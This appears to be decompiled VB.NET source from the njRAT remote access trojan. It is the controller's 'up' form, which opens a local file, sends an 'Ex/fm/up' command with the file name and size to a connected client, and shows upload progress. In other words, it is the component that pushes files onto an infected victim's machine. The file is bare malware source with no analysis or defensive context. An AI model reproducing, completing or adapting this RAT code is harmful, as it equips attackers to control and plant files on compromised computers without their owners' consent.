Imports System
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Drawing
Imports System.IO
Imports System.Runtime.CompilerServices
Imports System.Windows.Forms
Imports Microsoft.VisualBasic.CompilerServices

Namespace NJRAT
	' Token: 0x0200002E RID: 46
	<DesignerGenerated()>
	Public Partial Class up
		Inherits Form

		' Token: 0x17000155 RID: 341
		' (get) Token: 0x06000429 RID: 1065 RVA: 0x0002CAC8 File Offset: 0x0002ACC8
		' (set) Token: 0x0600042A RID: 1066 RVA: 0x0002CAD2 File Offset: 0x0002ACD2
		Friend Overridable Property ProgressBar1 As ProgressBar

		' Token: 0x17000156 RID: 342
		' (get) Token: 0x0600042B RID: 1067 RVA: 0x0002CADB File Offset: 0x0002ACDB
		' (set) Token: 0x0600042C RID: 1068 RVA: 0x0002CAE8 File Offset: 0x0002ACE8
		Friend Overridable Property Button1 As Button
			<CompilerGenerated()>
			Get
				Return Me._Button1
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Button)
				Dim value2 As EventHandler = AddressOf Me.Button1_Click
				Dim button As Button = Me._Button1
				If button IsNot Nothing Then
					RemoveHandler button.Click, value2
				End If
				Me._Button1 = value
				button = Me._Button1
				If button IsNot Nothing Then
					AddHandler button.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000157 RID: 343
		' (get) Token: 0x0600042D RID: 1069 RVA: 0x0002CB2B File Offset: 0x0002AD2B
		' (set) Token: 0x0600042E RID: 1070 RVA: 0x0002CB35 File Offset: 0x0002AD35
		Friend Overridable Property Lv1 As GClass9

		' Token: 0x17000158 RID: 344
		' (get) Token: 0x0600042F RID: 1071 RVA: 0x0002CB3E File Offset: 0x0002AD3E
		' (set) Token: 0x06000430 RID: 1072 RVA: 0x0002CB48 File Offset: 0x0002AD48
		Friend Overridable Property vmethod_4 As Timer
			<CompilerGenerated()>
			Get
				Return Me._vmethod_4
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Timer)
				Dim value2 As EventHandler = AddressOf Me.vmethod_4_Tick
				Dim vmethod_ As Timer = Me._vmethod_4
				If vmethod_ IsNot Nothing Then
					RemoveHandler vmethod_.Tick, value2
				End If
				Me._vmethod_4 = value
				vmethod_ = Me._vmethod_4
				If vmethod_ IsNot Nothing Then
					AddHandler vmethod_.Tick, value2
				End If
			End Set
		End Property

		' Token: 0x17000159 RID: 345
		' (get) Token: 0x06000431 RID: 1073 RVA: 0x0002CB8B File Offset: 0x0002AD8B
		' (set) Token: 0x06000432 RID: 1074 RVA: 0x0002CB95 File Offset: 0x0002AD95
		Friend Overridable Property ColumnHeader1 As ColumnHeader

		' Token: 0x1700015A RID: 346
		' (get) Token: 0x06000433 RID: 1075 RVA: 0x0002CB9E File Offset: 0x0002AD9E
		' (set) Token: 0x06000434 RID: 1076 RVA: 0x0002CBA8 File Offset: 0x0002ADA8
		Friend Overridable Property ColumnHeader2 As ColumnHeader

		' Token: 0x06000435 RID: 1077 RVA: 0x0002CBB4 File Offset: 0x0002ADB4
		Public Sub New()
			AddHandler MyBase.FormClosing, AddressOf Me.up_FormClosing
			AddHandler MyBase.Load, AddressOf Me.up_Load
			Me.Closinge = False
			Me.os = 0
			Me.InitializeComponent()
		End Sub

		' Token: 0x06000436 RID: 1078 RVA: 0x0000BCE1 File Offset: 0x00009EE1
		Private Sub Button1_Click(sender As Object, e As EventArgs)
			MyBase.Close()
		End Sub

		' Token: 0x06000437 RID: 1079 RVA: 0x0002CC04 File Offset: 0x0002AE04
		Private Sub up_FormClosing(sender As Object, e As FormClosingEventArgs)
			Me.Closinge = True
			Try
				Me.FS.Close()
				Me.FS.Dispose()
			Catch ex As Exception
			End Try
			Try
				Me.sk.Close()
			Catch ex2 As Exception
			End Try
		End Sub

		' Token: 0x06000438 RID: 1080 RVA: 0x0002CC80 File Offset: 0x0002AE80
		Private Sub up_Load(sender As Object, e As EventArgs)
			Me.FS = New FileStream(Me.TMP, FileMode.Open)
			Me.Lv1.Items(0).SubItems(0).Text = New FileInfo(Me.TMP).Name
			Me.Lv1.Items(1).SubItems(0).Text = Class6.smethod_17(CLng(Me.SZ))
			Me.Lv1.Items(2).SubItems(0).Text = Class6.smethod_17(0L)
			Me.Lv1.Items(3).SubItems(0).Text = Class6.smethod_17(0L)
			Me.ProgressBar1.Maximum = Me.SZ
			Me.osk.Send(String.Concat(New String() { "Ex", Class7.string_1, "fm", Class7.string_1, "up", Class7.string_1, Me.osk.ip(), Class7.string_1, Class6.smethod_14(Me.FN), Class7.string_1, Conversions.ToString(Me.SZ) }))
			Me.Lv1.method_3()
			Me.vmethod_4.Enabled = True
		End Sub

		' Token: 0x06000439 RID: 1081 RVA: 0x0002CE04 File Offset: 0x0002B004
		Private Sub vmethod_4_Tick(sender As Object, e As EventArgs)
			Try
				Me.Lv1.Items(2).SubItems(1).Text = Class6.smethod_17(CLng((Me.ProgressBar1.Value - Me.os)))
				Me.os = Me.ProgressBar1.Value
				Me.Lv1.Items(3).SubItems(1).Text = Class6.smethod_17(CLng(Me.ProgressBar1.Value))
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x04000247 RID: 583
		Public Closinge As Boolean

		' Token: 0x04000248 RID: 584
		Public FN As String

		' Token: 0x04000249 RID: 585
		Public FS As FileStream

		' Token: 0x0400024A RID: 586
		Public os As Integer

		' Token: 0x0400024B RID: 587
		Public osk As Client

		' Token: 0x0400024C RID: 588
		Public sk As Client

		' Token: 0x0400024D RID: 589
		Public SZ As Integer

		' Token: 0x0400024E RID: 590
		Public TMP As String
	End Class
End Namespace
